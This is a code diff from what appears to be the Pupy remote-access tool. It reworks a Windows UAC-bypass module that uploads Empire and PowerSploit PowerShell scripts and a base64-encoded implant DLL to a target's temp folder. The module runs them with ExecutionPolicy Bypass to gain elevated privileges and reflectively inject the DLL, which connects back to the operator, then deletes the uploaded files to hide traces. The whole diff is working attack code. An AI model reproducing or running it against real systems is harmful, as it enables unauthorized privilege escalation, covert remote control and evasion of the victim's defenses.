@@ -5,9 +5,10 @@ import platform
 import pupygen
 from rpyc.utils.classic import upload
 import base64
-from tempfile import gettempdir
+from tempfile import gettempdir, _get_candidate_names
 import subprocess
-
+from modules.lib.windows.powershell_upload import execute_powershell_script
+import re
 
 def bypassuac_through_trusted_publisher_certificate(module, rootPupyPath):
 	'''
@@ -15,37 +16,36 @@ def bypassuac_through_trusted_publisher_certificate(module, rootPupyPath):
 	'''
 	module.client.load_package("psutil")
 	module.client.load_package("pupwinutils.processes")
+	#Define Remote paths
 	remoteTempFolder=module.client.conn.modules['os.path'].expandvars("%TEMP%")
-	changeMeTag = "$$$CHANGE_ME$$$"
-	#First powershell script executed by Invoke-BypassUAC
-	mainPowerShellScript = """
-	cat $$$CHANGE_ME$$$\Invoke-BypassUAC.txt | Out-String  | iex
-	Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file $$$CHANGE_ME$$$\secdPowerShellScriptPrivileged.ps1' -Verbose
-	"""
-	#Second powershell script executed by first main script (privileged)
-	secdPowerShellScriptPrivileged = """
-	cat $$$CHANGE_ME$$$\Invoke-ReflectivePEInjection.txt | Out-String  | iex
-	cat $$$CHANGE_ME$$$\dllFile.txt | Out-String  | iex
+	invokeReflectivePEInjectionRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
+	invokeBypassUACRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
+	mainPowershellScriptRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
+	pupyDLLRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
+	#Define Local paths
+	mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
+	invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
+	invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
+	invokeBypassUACLocalPath = os.path.join(rootPupyPath,"pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
+	pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
+	#Constants
+	bypassUACcmd = "Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file {0} -Verbose'".format(mainPowershellScriptRemotePath) #{0}=mainPowerShellScriptPrivileged.ps1
+	byPassUACSuccessString = "DLL injection complete!"
+	#main powershell script executed by bypassuac powershell script
+	mainPowerShellScriptPrivileged = """
+	cat {0} | Out-String  | iex
+	cat {1} | Out-String  | iex
 	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
-	""" 
-	mainPowerShellScriptPath = os.path.join(gettempdir(),'mainPowerShellScript.txt')
-	logging.info("Creating the main Powershell script in %s locally"%(mainPowerShellScriptPath))
-	f = open(mainPowerShellScriptPath,'w+')
-	f.write(mainPowerShellScript.replace(changeMeTag, remoteTempFolder))
-	f.close()
-	secdPowerShellScriptPrivilegedPath = os.path.join(gettempdir(),'secdPowerShellScriptPrivileged.txt')
-	logging.info("Creating the second Powershell script in %s locally"%(secdPowerShellScriptPrivilegedPath))
-	f = open(secdPowerShellScriptPrivilegedPath,'w+')
-	f.write(secdPowerShellScriptPrivileged.replace(changeMeTag, remoteTempFolder))
-	f.close()
-	logging.info("Uploading powershell code for DLL injection...")
-	upload(module.client.conn, os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), module.client.conn.modules['os.path'].join(remoteTempFolder,'Invoke-ReflectivePEInjection.txt'))
-	logging.info("Uploading powershell code for UAC Bypass...")
-	upload(module.client.conn, os.path.join(rootPupyPath,"pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1"), module.client.conn.modules['os.path'].join(remoteTempFolder,'Invoke-BypassUAC.txt'))
-	logging.info("Uploading main powershell script...")
-	upload(module.client.conn, mainPowerShellScriptPath, module.client.conn.modules['os.path'].join(remoteTempFolder,'mainPowerShellScript.ps1'))
-	logging.info("Uploading second powershell script...")
-	upload(module.client.conn, secdPowerShellScriptPrivilegedPath, module.client.conn.modules['os.path'].join(remoteTempFolder,'secdPowerShellScriptPrivileged.ps1'))
+	""" #{0}=Invoke-ReflectivePEInjection.txt and {1}=dllFile.txt
+	logging.info("Creating the Powershell script in %s locally"%(mainPowerShellScriptPrivilegedLocalPath))
+	with open(mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
+		w.write(mainPowerShellScriptPrivileged.format(invokeReflectivePEInjectionRemotePath, pupyDLLRemotePath))
+	logging.info("Uploading powershell code for DLL injection in {0}".format(invokeReflectivePEInjectionRemotePath))
+	upload(module.client.conn, invokeReflectivePEInjectionLocalPath, invokeReflectivePEInjectionRemotePath)
+	#logging.info("Uploading powershell code for UAC Bypass in {0}".format())
+	#upload(module.client.conn, invokeBypassUACLocalPath, invokeBypassUACRemotePath)
+	logging.info("Uploading main powershell script executed by BypassUAC in {0}".format(mainPowerShellScriptPrivilegedLocalPath))
+	upload(module.client.conn, mainPowerShellScriptPrivilegedLocalPath, mainPowershellScriptRemotePath)
 	res=module.client.conn.modules['pupy'].get_connect_back_host()
 	host, port = res.rsplit(':',1)
 	logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
@@ -59,20 +59,23 @@ def bypassuac_through_trusted_publisher_certificate(module, rootPupyPath):
 	else:
 		module.error("Target architecture is unknown (!= x86 or x64), abording...")
 		return 
-	pupyDLLPath = os.path.join(gettempdir(),'dllFile.txt')
-	remotePupyDLLPath = module.client.conn.modules['os.path'].join(remoteTempFolder,'dllFile.txt')
-	logging.info("Creating the pupy dll in %s locally"%(pupyDLLPath))
-	f = open(pupyDLLPath,'w+')
-	f.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
-	f.close()
-	logging.info("Uploading pupy dll...")
-	upload(module.client.conn, pupyDLLPath, remotePupyDLLPath)
-	output = module.client.conn.modules.subprocess.check_output("PowerShell.exe -ExecutionPolicy Bypass -File %s"%(module.client.conn.modules['os.path'].join(remoteTempFolder,'mainPowerShellScript.ps1')), stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
-	logging.info("BypassUAC script output: %s"%(output))
-	if "DLL injection complete!" in output:
+	logging.info("Creating the pupy dll in %s locally"%(pupyDLLLocalPath))
+	with open(pupyDLLLocalPath, 'w+') as w:
+		w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
+	logging.info("Uploading pupy dll in {0}".format(pupyDLLRemotePath))
+	upload(module.client.conn, pupyDLLLocalPath, pupyDLLRemotePath)
+	content = re.sub("Write-Verbose ","Write-Output ", open(invokeBypassUACLocalPath, 'r').read(), flags=re.I)
+	logging.info("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
+ 	output = execute_powershell_script(module, content, bypassUACcmd)
+	logging.info("BypassUAC script output: %s\n"%(output))
+	if byPassUACSuccessString in output:
 		module.success("UAC bypassed")
 	else:
-		module.warning("Impossible to know what's happened remotely")
+		module.warning("Impossible to know what's happened remotely. You should active debug mode.")
+	for aFile in [invokeReflectivePEInjectionRemotePath, invokeBypassUACRemotePath, mainPowershellScriptRemotePath, pupyDLLRemotePath]:
+		logging.info("Deleting remote file {0}".format(aFile))
+		output = module.client.conn.modules.subprocess.check_output("DEL /F /Q \"{0}\"".format(aFile), stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
+		logging.debug("Delete Status: {0}".format(repr(output)))
 	module.success("Waiting for a connection from the DLL (take few seconds)...")
 
 
